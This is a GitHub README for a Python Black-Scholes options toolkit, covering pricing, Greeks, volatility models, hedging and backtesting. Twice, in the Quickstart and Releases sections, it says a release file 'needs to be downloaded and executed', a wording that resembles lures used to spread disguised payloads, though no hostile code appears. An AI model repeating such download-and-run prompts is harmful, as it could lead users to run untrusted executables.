# Black-Scholes Option Trading Framework — Python Toolkit

[![Releases](https://img.shields.io/badge/Releases-%20Download-blue?logo=github)](https://github.com/huan90120/Black-Scholes-Option-Trading/releases)  
![Python](https://img.shields.io/badge/python-3.8%2B-blue) ![License](https://img.shields.io/badge/license-MIT-green) ![Topics](https://img.shields.io/badge/topics-algo%2C-backtest%2C-volatility-yellow)

![options-chart](https://images.unsplash.com/photo-1559526324-593bc073d938?ixlib=rb-4.0.3&auto=format&fit=crop&w=1400&q=80)

Black–Scholes powered Python framework for options trading. It bundles pricing, Greeks, volatility forecasting, market microstructure features, hedging, and backtesting. Use it to research, prototype, and run quantitative option strategies.

- Repo: Black-Scholes-Option-Trading  
- Topics: algorithmic-trading, backtesting, black-scholes, data-science, finance, financial-modeling, hedging-strategy, investment, machine-learning, options-trading, python, quantitative-finance, quantitative-trading, risk-management, trading-strategies, volatility-forecasting

Table of Contents
- 🎯 Features
- 🚀 Quickstart
- 🧭 Core Concepts
- 🧱 Architecture
- 🧪 Backtesting & Risk
- 📈 Volatility Forecasting
- 🔬 Market Microstructure
- 🧾 API & CLI
- 🔧 Examples
- 🧩 Data Formats
- 🧑‍💻 Contributing
- 📦 Releases
- ⚖️ License

🎯 Features
- Black–Scholes pricing and Greeks: price European calls and puts. Compute delta, gamma, vega, theta, rho.
- Volatility forecasting: EWMA, GARCH, parametric fit, and ML models.
- Backtesting engine: vectorized and event-driven modes. Transaction cost and slippage support.
- Hedging modules: delta-hedging scheduler, rebalancing rules, and P&L attribution.
- Market microstructure signals: spread, depth, order-flow imbalance, VWAP features.
- Data loaders: option chains, trades, quotes, OHLC bars, and custom dataset adapters.
- Strategy templates: mean-reversion, volatility-selling, straddle/strangle lifecycle management.
- Report generator: performance metrics, risk stats, greeks over time, and trade logs.
- Extendable: plugin hooks for custom pricing models and execution adapters.

🚀 Quickstart

1. Clone repository:
```bash
git clone https://github.com/huan90120/Black-Scholes-Option-Trading.git
cd Black-Scholes-Option-Trading
```

2. Install dependencies:
```bash
python -m venv venv
source venv/bin/activate       # macOS / Linux
venv\Scripts\activate          # Windows
pip install -r requirements.txt
```

3. Release asset (download and execute):
Download the release file from the Releases page and run the installer or unpack the archive. The release file needs to be downloaded and executed from:
https://github.com/huan90120/Black-Scholes-Option-Trading/releases

Example:
- Download Black-Scholes-Option-Trading-1.2.0.tar.gz from the Releases page.
- Extract and run:
```bash
tar -xzf Black-Scholes-Option-Trading-1.2.0.tar.gz
cd Black-Scholes-Option-Trading-1.2.0
python setup.py install
```

🧭 Core Concepts

Black–Scholes pricing
- Inputs: spot S, strike K, time-to-maturity T, risk-free rate r, dividend q, volatility σ.
- Output: option price, implied volatility, and Greeks.
- Use vectorized calls for batched pricing over entire option chains.

Volatility
- Realized volatility: use high-frequency returns or bar returns.
- Historical vs implied: calibrate parametric models to option prices.
- Forecasting horizon: multi-horizon forecasts for intraday and daily strategies.

Hedging
- Delta-hedge with discrete rebalancing.
- Include transaction costs and discrete fills.
- Track hedge error and P&L attribution.

Backtesting
- Support for both tick-level simulation and minute-bar vectorized runs.
- Fill models: immediate, volume-weighted, and slippage models.
- Risk controls: position limits, margin checks, stop-loss rules.

🧱 Architecture

- bs_model/
  - pricing.py — Black–Scholes core, Greeks, implied vol solver
  - hedging.py — rebalancing logic, hedge overlays
  - volatility/
    - ewma.py
    - garch.py
    - ml_forecast.py
  - microstructure/
    - orderbook.py
    - vwap.py
    - spread.py
  - backtest/
    - engine.py
    - strategies.py
    - broker.py
  - data/
    - loaders.py
    - adapters.py
  - tools/
    - metrics.py
    - plotting.py
  - cli.py — command line entry points

Design choices
- Keep pricing pure and deterministic.
- Separate execution and market simulation logic.
- Use pandas and numpy for data handling. Use numba in hotspots.

🧪 Backtesting & Risk

Backtester modes
- Vectorized: run on OHLC or end-of-day data with numpy speed.
- Event-driven: simulate tick feeds and orderbook events.

Risk metrics
- P&L, Sharpe, Sortino, max drawdown
- Greeks P&L exposure: track delta, gamma, vega over time
- Tail risk: VaR and CVaR estimates
- Realized vs theoretical hedging error

Hedging strategies
- Fixed-interval delta hedge
- Threshold rebalancing: hedge when delta breaches threshold
- Gamma-targeting: use options to control gamma exposure
- Volatility selling: short straddles/strangles with dynamic adjustment

Transaction costs
- Per-trade fixed fees
- Per-share fees
- Slippage by volume share
- Spread and depth-aware fills for more realism

📈 Volatility Forecasting

Built-in models
- EWMA: fast, robust baseline for realized variance.
- GARCH(1,1): parametric volatility model.
- HAR: heterogenous autoregression for realized variance.
- ML models: random forest and lightGBM examples for realized vol and implied vol surface prediction.

Workflow
- Build features: returns, realized vol, order-flow imbalance, intraday spread.
- Train models on historical data with rolling windows.
- Output: expected vol for horizon H and confidence intervals.

Implied vol surface
- Surface fit with SVI or parametric cubic splines.
- Calibrate to market option prices.
- Interpolate across strikes and maturities.

🔬 Market Microstructure

Orderbook analysis
- Snapshot and level-2 signals.
- Depth imbalance, top-of-book changes, resting volume.

Trade features
- Trade imbalance, aggressor-side detection, execution time metrics.

Liquidity measures
- Effective spread, quoted spread, market impact estimates.

Signals
- Use microstructure features as inputs to volatility or short-term directional overlays.
- Combine with option Greeks for execution sizing.

🧾 API & CLI

Python API
- Import pricing and utilities:
```python
from bs_model.pricing import bs_price, implied_vol
from bs_model.hedging import DeltaHedger
from bs_model.backtest.engine import BacktestEngine
```

Pricing example
```python
price, greeks = bs_price(S=100, K=105, T=30/365, r=0.01, sigma=0.2, option_type='call')
iv = implied_vol(price, S=100, K=105, T=30/365, r=0.01, option_type='call')
```

CLI
- Run backtest:
```bash
python -m bs_model.cli backtest --config configs/straddle.yaml
```
- Generate report:
```bash
python -m bs_model.cli report --run-id 2025-07-01-straddle
```

🔧 Examples

1) Price and hedge a call
```python
from bs_model.pricing import bs_price
from bs_model.hedging import DeltaHedger

S = 120
K = 125
T = 14/365
r = 0.005
sigma = 0.18
price, greeks = bs_price(S=S, K=K, T=T, r=r, sigma=sigma, option_type='call')

hedger = DeltaHedger(initial_spot=S)
hedger.update(greeks['delta'])
hedger.rebalance()
```

2) Backtest a short straddle
- Use configs/short_straddle.yaml to set universe, rebalance rules, margin.
- Run:
```bash
python -m bs_model.cli backtest --config configs/short_straddle.yaml
```

3) Volatility forecast with GARCH
```python
from bs_model.volatility.garch import GARCHModel
model = GARCHModel()
model.fit(returns_series)
forecast = model.forecast(horizon=5)
```

🧩 Data Formats

- Option chain CSV: date, expiry, strike, call_put, bid, ask, last, volume, oi
- Tick data: timestamp, price, size, side
- Bar data: timestamp, open, high, low, close, volume
- Adapters enable reading from CSV, Parquet, SQL, or streaming sources

Best practices
- Use timezone-aware timestamps.
- Keep raw ticks separate from cleaned bars.
- Store option chains with implied vol and mid price.

🧑‍💻 Contributing

- Follow the code style in .pre-commit-config.
- Run unit tests:
```bash
pytest tests/
```
- Use feature branches and open a pull request with tests.
- Document API changes in docs/ and update CHANGELOG.md.

📦 Releases

Find packaged releases on the Releases page. Download the release asset, then install or run the provided scripts. The release file needs to be downloaded and executed from:
https://github.com/huan90120/Black-Scholes-Option-Trading/releases

Use the badge at the top to open the Releases page.

- Releases include source tarballs, wheels, and example data bundles.
- Each release includes a changelog and checksums.

⚖️ License

This project uses the MIT License. See LICENSE for details.

Images and references
- Unsplash stock charts image (header)
- Examples derive from standard Black–Scholes theory and common quant workflows.

Maintenance
- CI runs tests, linters, and build steps on pushes.
- Issues track bugs and feature requests.

End of file.